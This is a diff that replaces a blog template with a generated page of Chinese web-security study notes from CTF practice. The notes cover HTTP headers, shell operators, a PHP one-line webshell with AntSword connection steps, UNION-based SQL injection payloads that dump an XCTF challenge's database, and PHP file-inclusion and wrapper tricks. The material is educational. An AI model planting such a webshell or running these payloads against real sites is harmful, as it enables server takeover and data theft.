@@ -1,37 +1,247 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    20200313学习总结 |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+  
+<link rel="stylesheet" href="/css/technology.css">
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+  
+  
+<script src="/js/pace.min.js"></script>
 
+<meta name="generator" content="Hexo 5.1.1"></head>
 
-{% block content %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-20200313学习总结" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      20200313学习总结
+    </h1>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
-    </div>
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/28/20200313%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2020-08-28T02:33:12.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
 
-{% endblock %}
+      </div>
+    
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <div class="article-entry" itemprop="articleBody">
+      
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+      
+
+      
+        <h3 id="0x01复习一些学过的内容"><a href="#0x01复习一些学过的内容" class="headerlink" title="0x01复习一些学过的内容"></a>0x01复习一些学过的内容</h3><h4 id="http请求头"><a href="#http请求头" class="headerlink" title="http请求头"></a>http请求头</h4><p><strong>http请求头基本格式</strong><br>一个真实的http请求报文结构如下所示：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;check.php HTTP&#x2F;1.1</span><br><span class="line">Host: 111.198.29.45:50839</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer:111.198.29.45:50839</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">a&#x3D;123&amp;b&#x3D;456</span><br></pre></td></tr></table></figure>
+<p>解析：<br>http请求可分为三部分：请求行、请求头、请求体<br>第一行即为请求行，组成为<code>请求方法 空格 请求地址 空格 协议版本</code>，请求方法即GET POST PUT DELETE OPTION等，请求地址为请求资源路径，’/index.php’意为<code>http://111.198.29.45:50839/index.php</code>，协议版本即使用的http协议版本，1.0或1.1<br>第2-10行为请求头，即header，请求头指定了该http请求的一些基本信息，常用的请求头类型有：  </p>
+<table>
+<thead>
+<tr>
+<th>Header</th>
+<th>解释</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Accept</td>
+<td>指定客户端能够接收的内容类型</td>
+<td><code>Accept: text/plain,text/html,application/json</code></td>
+</tr>
+<tr>
+<td>Accept-Charset</td>
+<td>浏览器可以接受的字符编码集</td>
+<td><code>Accept-Charset: iso-8859-5</code></td>
+</tr>
+<tr>
+<td>Accept-Encoding</td>
+<td>指定浏览器可支持的web服务器返回内容压缩编码类型</td>
+<td><code>Accept-Encoding:compress,gzip</code></td>
+</tr>
+<tr>
+<td>Cache-Control</td>
+<td>指定请求和响应遵循的缓存机制</td>
+<td><code>Cache-Control: no-cache</code></td>
+</tr>
+<tr>
+<td>Connection</td>
+<td>表示是否需要持久连接</td>
+<td><code>Connection: close</code></td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>http请求发送时会把保存在该请求域名下的所有cookie一起发送给web服务器</td>
+<td><code>Cookie:user=123;auth=admin;</code></td>
+</tr>
+<tr>
+<td>Content-Length</td>
+<td>请求内容长度</td>
+<td><code>Content-Length: 345</code></td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>请求的与实体对应的MIME信息</td>
+<td><code>Content-Type: application/x-www-form/urlencoded</code></td>
+</tr>
+<tr>
+<td>Date</td>
+<td>请求发送时间</td>
+<td><code>Date: Tue,15 Feb 2020 10:10:45 GMT</code></td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>包含发出请求的用户信息，例如浏览器，操作系统等</td>
+<td><code>User-Agent: Mozilla/5.0 (Linux;X11)</code></td>
+</tr>
+<tr>
+<td><strong>Host</strong></td>
+<td><strong>指定请求的服务器的域名和端口号</strong></td>
+<td><strong><code>Host:www.abc123.com</code></strong></td>
+</tr>
+<tr>
+<td><strong>Referer</strong></td>
+<td><strong>请求来路</strong></td>
+<td><strong><code>Referer: http://abc123.com/1.php</code></strong></td>
+</tr>
+<tr>
+<td><strong>X-Forwarded-For</strong></td>
+<td><strong>用户的真实ip地址</strong></td>
+<td><strong><code>X-Forwarded-For: 123.123.123.123</code></strong></td>
+</tr>
+</tbody></table>
+<p>第11行为空行，将请求头和请求体分开<br>第12行即请求体，请求体中包含查询字符串等信息  </p>
+<h4 id="shell重定向，-、-amp-、-和-amp-amp-的区别"><a href="#shell重定向，-、-amp-、-和-amp-amp-的区别" class="headerlink" title="shell重定向，| 、&amp; 、|| 和 &amp;&amp; 的区别"></a>shell重定向，| 、&amp; 、|| 和 &amp;&amp; 的区别</h4><p><strong>重定向输出 ‘&gt;’</strong><br>command &gt; file<br>将command的输出写入file中，如果file文件存在，则覆盖文件内容写入，如果不存在，则创建文件。<br>command &gt;&gt; file<br>将command的输入追加到file文件的末尾。<br><strong>重定向输入 ‘&lt;’</strong><br>command &lt; file<br>将标准输入流从键盘重定向到file文件。<br><strong>管道命令 ‘|’ **<br>command1 | command2<br>将command1的stdout作为command2的stdin。<br>**后台运行进程 ‘&amp;’</strong><br>command &amp;<br>将command置于后台运行<br>** ‘||’ 和 ‘&amp;&amp;’ **<br>command1 || command2 当command1未被正确执行时，才会执行command2，否则command2不执行。<br>command1 &amp;&amp; command2 当command1被正确执行时，才会执行command2，否则command2不执行。  </p>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>一句话木马：一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。<br>代码：<code>&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code><br>这段代码的意思很简单，执行通过POST获取到的内容。例如，我们创建一个文件，名字叫shell.php,里面写入这段代码，保存，随后通过浏览器访问/shell.php，同时通过POST传入要执行的命令，例如phpinfo，发现phpinfo被执行了。<br><img src="/assets/img/20200313学习总结/20200313学习总结1.jpg"><br>我们也可以通过蚁剑来连接，在蚁剑中新建连接，地址栏输入[ip]:[port]/shell.php,密码输入shell，点击连接，发现我们直接连接上了服务器，实现了getshell的操作。  </p>
+<h4 id="sql联合查询注入-无过滤"><a href="#sql联合查询注入-无过滤" class="headerlink" title="sql联合查询注入[无过滤]"></a>sql联合查询注入[无过滤]</h4><p>sql注入的原理：通过精心构造的payload，插入到原sql语句中，改变原sql语句的逻辑，从而实现攻击者想实现的操作。<br>这里回顾一下sql联合查询注入的操作。联合查询注入的前提是，页面上有显示位。所谓显示位即在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就是显示位。<br>用一个题来举例子。<br>题目来源：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4686&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4686&amp;page=1</a><br><img src="/assets/img/20200313学习总结/20200313学习总结2.jpg"><br>拿到题目，发现search框输入<code>&#39;</code>(单引号)会500响应，初步判断存在sql注入。<br><img src="/assets/img/20200313学习总结/20200313学习总结3.jpg"><br>判断一下sql语句拼接方式。<br><img src="/assets/img/20200313学习总结/20200313学习总结4.jpg"><br>下一步开始注入，先判断列数。<br><img src="/assets/img/20200313学习总结/20200313学习总结5.jpg"><br>发现输入order by 3#有回显，而order by 4#则500响应，判断列数为3.<br>下一步开始逐步爆库，爆表，爆列。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3#</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/20200313学习总结/20200313学习总结6.jpg">  
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;news&#39;),3#</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/20200313学习总结/20200313学习总结7.jpg">  
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;news&#39; and table_name&#x3D;&#39;secret_table&#39;),3#</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/20200313学习总结/20200313学习总结8.jpg">  
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select fl4g from secret_table),3#</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/20200313学习总结/20200313学习总结9.jpg">  
+### 0x02一些新学的
+#### php文件包含
+php的include命令会首先检测include的文件是否存在，如果存在则执行该文件。以一个题为例：  
+题目来源：https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1  
+拿到题目可以看出是代码审计，获取hello和page参数，其中如果page参数中含有```php://```字样则会过滤。本题思路就是利用php的文件包含特性来实现代码执行。  
+<img src="/assets/img/20200313学习总结/20200313学习总结10.jpg">  
+<img src="/assets/img/20200313学习总结/20200313学习总结11.jpg">  
+<img src="/assets/img/20200313学习总结/20200313学习总结12.jpg">  
+<img src="/assets/img/20200313学习总结/20200313学习总结13.jpg">  
+#### php data伪协议
+还是上面那个题，除了通过文件包含，还可以利用php的data伪协议来读取文件。  
+<img src="/assets/img/20200313学习总结/20200313学习总结14.jpg">  
+<img src="/assets/img/20200313学习总结/20200313学习总结15.jpg">  
+当然这个题也可以通过大小写绕过来实现使用```php://filter```伪协议完成文件内容读取。最后base64解码即可。  
+<img src="/assets/img/20200313学习总结/20200313学习总结16.jpg">  
+#### .phps源代码文件
+.phps为php的源代码文件，通常在题目页面无提示时，可以结合题目提示来考虑是否存在源代码泄露，然后可以尝试读取.phps。  
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://su29029.github.io/2020/08/28/20200313%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" data-id="ckedortl00000xity62hr3e6j"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/28/20200315%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            20200315学习总结
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/28/%E4%BD%BF%E7%94%A8C%E8%AF%AD%E8%A8%80%E6%A8%A1%E6%8B%9Fjs%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">使用C语言模拟js前后端交互</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
